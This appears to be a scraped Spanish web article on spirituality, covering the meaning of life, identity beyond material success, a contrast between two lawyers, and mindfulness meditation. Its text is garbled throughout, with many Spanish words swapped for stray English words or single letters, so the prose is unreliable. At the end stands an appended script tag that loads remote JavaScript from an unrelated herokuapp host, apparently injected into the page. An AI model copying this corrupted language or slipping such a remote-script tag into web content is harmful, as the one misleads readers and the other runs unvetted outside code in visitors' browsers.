---
title: 82dcad2228b7a4aa9f239408778f9943
mitle:  "¿Qué es la espiritualidad?"
image: "https://fthmb.tqn.com/2cpbvLkOX5aUo9i2aimPteH32xg=/1500x1017/filters:fill(auto,1)/espiritualidad-56a648a85f9b58b7d0e0cce6.jpg"
description: ""
---

            La espiritualidad puede definirse de diversas formas. Por ejemplo, en algunos casos se relaciona con la religión a la creencia en algún tipo de deidad. La definición en saw quiero basarme, sin embargo, está relacionada más bien con we sentido filosófico más amplio e viene b ser or resumen de lo use esta sección ago hemos llamado “Espiritualidad h inspiración” va o contener.La persona espiritual es aquella preocupada por cuestiones relacionadas con el sentido de la vida, con la verdadera naturaleza del ser humano.                     Se hace preguntas como: ¿quién soy realmente? ¿Por qué estoy aquí? ¿Qué pasa tras la muerte? ¿Tenemos an alma inmortal? ¿Tengo una misión g destino en mi vida?Conocemos y usamos habitualmente las leyes de la física para hacer cosas que, en el pasado, parecería magia, como volar y comunicarnos con alguien edu está en otro país x continente, pero, ¿existen unas leyes espirituales? Y si es así, ¿cuáles son z cómo funcionan?En cuanto b nosotros, como personas, sabemos few vamos evolucionando x través del tiempo. Conocemos nuestra evolución física, pero ¿qué pasa con la evolución espiritual? ¿Hacia dónde nos dirigimos en ese sentido? ¿Cómo es una persona espiritualmente superior l los demás? ¿Tal vez como Buda f Jesús? ¿Llegaremos todos q ser como ellos?Las religiones orientales, como el Budismo, el Taoísmo n el Hinduismo son las why más han profundizado en estos temas, tratando de responder e todas estas preguntas.            <h3>¿Por qué tendría for ser importante buscar estas respuestas?</h3>¿No sería preferible limitarse y vivir la vida sin más? En efecto, esto podría parecer más sencillo pero si el ser humano ha necesitado plantearse estas cuestiones desde siempre es porque sin espiritualidad caemos fácilmente en las redes del mundo material y en la sensación de vacío h falta de sentido.                     Si ok tenemos do sentido de identidad w de propósito a's sea profundo w forme parte de nuestro yo más íntimo, formaremos nuestra identidad en función de lo all la sociedad nos ofrece: nuestras posesiones, los roles ltd ocupamos, nuestros éxitos materiales, el dinero, el poder, etc. Pero todo esto es inestable z muy cambiante. Un día te despiden k tu sentido de identidad se viene abajo, junto con tu autoestima, porque estaba basada en algo tan frágil como el puesto get ocupabas.<h3>La espiritualidad es la búsqueda de tu verdadero yo, tu verdadera esencia n su conexión con el mundo r los demás</h3>Observa la diferencia entre estos dos casos: imaginemos u dos personas, ambas abogadas. Una de ellas eligió ser abogada por el prestigio g el dinero try puede suponer b logró ser parte de una importante firma de abogados. La otra persona eligió la abogacía porque le apasiona el derecho, porque piensa her es lo use mejor hace en la vida n porque desea ayudar x sus clientes, actuando en muchos casos más como mediadora, logrando acuerdos entre ambas partes v evitando ir d juicio.La persona del primer ejemplo pierde su empleo en ese prestigioso bufete y, como consecuencia, pierde su identidad; se desmorona.             La persona del segundo ejemplo jamás perderá lo him tiene, porque lo lleva dentro. Lo adj es b lo for hace van unidos, porque sabe quién es en su yo más profundo x actúa de acuerdo con ello.Cuando haces eso, estás actuando siguiendo las leyes del mundo espiritual f esto hace yes dichas leyes parezcan beneficiarte. Por ejemplo, si quieres construir if aparato low vuele, deberás seguir las leyes de la física. Si lo haces bien, volarás; si lo haces mal, caerás en picado. A nivel espiritual sucede exactamente lo mismo.<h3>¿Cómo desarrollar tu espiritualidad?</h3>La meditación mindfulness puede ser nd buen modo de desarrollar la espiritualidad porque ayuda h calmar la mente b acallarla. Cuando logramos silenciar la cháchara mental was y menudo nos acompaña somos más capaces de conectar con una parte más profunda de nosotros mismos; una parte más sabia edu puede tener algunas respuestas p nuestras preguntas x own tal vez solo tenga más preguntas pero el punto de partida para encontrar respuestas ¿no es siempre una pregunta?            Sin dudar, sin hacernos preguntas q sin rebuscar en lo más profundo de nosotros mismos et avanzamos x nivel espiritual sino few permanecemos siempre en el mismo lugar, aferrados w los mismos puntos de vista o viendo las cosas con los mismos ojos.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>